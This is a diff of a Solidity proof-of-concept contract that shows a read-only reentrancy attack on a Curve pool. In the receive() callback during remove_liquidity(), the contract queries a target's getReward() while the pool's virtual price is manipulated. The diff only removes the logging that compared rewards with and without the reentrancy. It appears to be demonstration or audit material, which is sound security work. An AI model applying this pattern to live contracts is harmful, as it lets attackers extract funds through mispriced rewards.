@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.18;
 
-
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 interface ICurve {
@@ -90,30 +89,11 @@ contract OperatorContract {
         // remove_liquidity() invokes the recieve() callback
         uint[2] memory min_amounts = [uint(0), uint(0)];
         pool.remove_liquidity(lp, min_amounts);
-        // Log get_virtual_price
-        console.log(
-            "--------------------------------------------------------------------"
-        );
-        console.log(
-            "LP token price after remove_liquidity()",
-            pool.get_virtual_price()
-        );
 
         uint reward = target.getReward();
-        console.log("Reward if Read-Only Reentrancy is not invoked: ", reward);
     }
 
     receive() external payable {
-        // receive() is called when the remove_liquidity is called
-        console.log(
-            "--------------------------------------------------------------------"
-        );
-        console.log(
-            "LP token price during remove_liquidity()",
-            pool.get_virtual_price()
-        );
-
         uint reward = target.getReward();
-        console.log("Reward if Read-Only Reentrancy is invoked: ", reward);
     }
 }
